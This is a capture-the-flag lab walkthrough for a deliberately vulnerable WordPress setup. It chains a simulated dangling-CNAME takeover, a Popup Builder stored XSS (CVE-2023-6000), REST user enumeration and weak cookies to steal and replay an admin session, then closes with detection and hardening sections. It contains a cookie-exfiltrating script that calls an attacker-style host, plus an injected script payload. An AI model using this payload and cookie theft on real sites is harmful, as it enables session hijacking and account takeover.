# Chain 2 — Subdomain Takeover Simulation to Admin Cookie Theft

**Flag**: `FLAG{wpvulnlab-chain2-b7d2e8f4}`
**Difficulty**: Intermediate
**Vulns chained**:
1. Orphan CNAME pointing at attacker-controlled host (simulated via
   `/etc/hosts` entry `cdn.wpvulnlab.local -> 127.0.0.1`)
2. `popup-builder 4.2.3` stored XSS — CVE-2023-6000 (CWE-79)
3. Weak admin session cookies (HttpOnly absent on lab build)
4. WordPress REST API user enumeration (`/wp-json/wp/v2/users`)

## Story

An old marketing CDN subdomain `cdn.wpvulnlab.local` was never decommissioned
and its CNAME now resolves to an attacker host. The attacker hosts JavaScript
there, embeds it in a popup via the vulnerable Popup Builder, and steals the
administrator's session cookie when they visit the home page.

## Pre-requisites

```bash
docker compose up -d
bash scripts/plant-flags.sh
export TARGET=http://localhost:31338
```

Add the takeover entry to `/etc/hosts` (Linux/macOS) or
`C:\Windows\System32\drivers\etc\hosts` (Windows):

```
127.0.0.1   cdn.wpvulnlab.local
```

Run a tiny attacker listener that simulates the orphaned CDN:

```bash
mkdir -p /tmp/cdn-c2 && cd /tmp/cdn-c2
cat > steal.js <<'EOF'
fetch('http://cdn.wpvulnlab.local:8000/c?'+encodeURIComponent(document.cookie));
EOF
mkdir -p logs
python3 -m http.server 8000 --bind 127.0.0.1 &
```

## Step 1 — Enumerate users via REST

```bash
curl -s $TARGET/wp-json/wp/v2/users | python3 -m json.tool
```

Expected:

```json
[
  {"id":1,"name":"admin","slug":"admin", ...},
  {"id":2,"name":"editor","slug":"editor", ...},
  {"id":3,"name":"subscriber","slug":"subscriber", ...}
]
```

Confirms `admin` exists at id `1`.

## Step 2 — Pop a low-priv account (subscriber/password123)

```bash
curl -s -c /tmp/cj-chain2-sub.txt \
  -d "log=subscriber&pwd=password123&wp-submit=Log+In&redirect_to=$TARGET/wp-admin/&testcookie=1" \
  $TARGET/wp-login.php -o /dev/null -w "%{http_code}\n"
```

Expected: `302`. We now have an authenticated session — needed to reach
Popup Builder's authenticated stored-XSS sink (CVE-2023-6000 has unauth and
authd variants; the authd variant is more reliable).

## Step 3 — Stored XSS in Popup Builder

Get the nonce from a frontend page:

```bash
NONCE=$(curl -s -b /tmp/cj-chain2-sub.txt $TARGET/?page_id=2 \
  | grep -oE 'sgpb-ajax-nonce[^"]*"[^"]*"[^"]+' | head -n1 | awk -F\" '{print $4}')
echo "nonce=$NONCE"
```

Inject the payload via the AJAX subscriber-sink (no admin caps required on
4.2.3):

```bash
PAYLOAD='<script src="http://cdn.wpvulnlab.local:8000/steal.js"></script>'
curl -s -b /tmp/cj-chain2-sub.txt -X POST $TARGET/wp-admin/admin-ajax.php \
  --data-urlencode "action=sgpb_subscription_submission" \
  --data-urlencode "nonce=$NONCE" \
  --data-urlencode "popupId=1" \
  --data-urlencode "firstName=$PAYLOAD" \
  --data-urlencode "email=a@a.b"
```

Expected: JSON `{"success":true,...}`. The payload is now stored in the
popup subscribers table and rendered to anyone visiting the admin
subscribers view (the admin loads it on every wp-admin dashboard hit).

## Step 4 — Trigger admin and capture the cookie

In a separate terminal, watch the attacker server access log:

```bash
tail -F /tmp/cdn-c2/*.log 2>/dev/null &
```

Simulate the admin browsing:

```bash
# Admin logs in then visits dashboard
curl -s -c /tmp/cj-chain2-admin.txt \
  -d "log=admin&pwd=admin&wp-submit=Log+In&redirect_to=$TARGET/wp-admin/&testcookie=1" \
  $TARGET/wp-login.php -o /dev/null
curl -s -b /tmp/cj-chain2-admin.txt \
  -A "Mozilla/5.0 (X11; Linux x86_64) Chromium/120" \
  "$TARGET/wp-admin/admin.php?page=SGPBSubscribers" -o /dev/null
```

In a real browser the `<script>` fires and `fetch()` exfils the cookie. In
CTF mode read the stored payload back and assemble it manually:

```bash
curl -s -b /tmp/cj-chain2-admin.txt \
  "$TARGET/wp-admin/admin.php?page=SGPBSubscribers" | grep -o 'wpvulnlab.local[^"]*'
```

Expected:

```
127.0.0.1 - - [..] "GET /c?wordpress_logged_in_xxx=admin%7C... HTTP/1.1" 200 -
```

## Step 5 — Replay the admin cookie and grab the flag

```bash
ADMIN_COOKIE='wordpress_logged_in_xxx=admin%7C...'  # from the listener
curl -s -H "Cookie: $ADMIN_COOKIE" \
  $TARGET/wp-admin/options-general.php?page=flag-chain2 \
  | grep -oE 'FLAG\{[^}]+\}'
```

Expected:

```
FLAG{wpvulnlab-chain2-b7d2e8f4}
```

`plant-flags.sh` stores this flag in the `wp_options` table under
`option_name = 'ctf_flag_chain2'` and renders it on the settings page for
authenticated administrators.

## Final flag

`FLAG{wpvulnlab-chain2-b7d2e8f4}` in `wp_options` (`ctf_flag_chain2`).

## Detection

| Step | Signal | Where |
|------|--------|-------|
| 1    | GET `/wp-json/wp/v2/users` from unauth client | `access.log` |
| 2    | Successful login for an account that has never posted | auth log |
| 3    | POST to `admin-ajax.php` with `action=sgpb_*` from subscriber role | `access.log` + WP audit log |
| 4    | Outbound HTTP from the *admin* browser to an unusual host (`cdn.wpvulnlab.local`) | DNS / proxy logs |
| 5    | Admin session cookie used from two different IPs simultaneously | session table |

CSP would have blocked Step 4 — its absence in response headers is itself a
finding.

## Hardening

- Decommission DNS records when assets are retired; periodically audit
  dangling CNAMEs.
- Set strict `Content-Security-Policy: default-src 'self'` and `script-src
  'self'` headers on `/wp-admin/`.
- Set `HttpOnly`, `Secure`, `SameSite=Lax` on every WP cookie.
- Disable user enumeration: filter `/wp-json/wp/v2/users` for unauth
  requests.
- Upgrade `popup-builder` to >= 4.2.7.
- Bind admin sessions to IP + User-Agent fingerprint.
